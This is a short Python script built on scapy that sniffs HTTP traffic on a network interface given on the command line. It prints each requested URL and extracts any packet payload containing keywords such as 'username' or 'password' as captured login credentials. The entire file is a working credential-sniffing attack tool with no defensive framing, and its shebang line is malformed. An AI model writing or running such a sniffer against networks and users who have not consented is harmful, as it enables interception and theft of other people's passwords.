#! usr/bin/env python

import scapy.all as scapy
import optparse
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "uname", "password", "pass", "login"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())

        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + login_info + "\n\n")

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface who want to sniff the packages")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-]Please add an interface, type --help for more help")
    return options


options = get_arguments()
sniff(options.interface)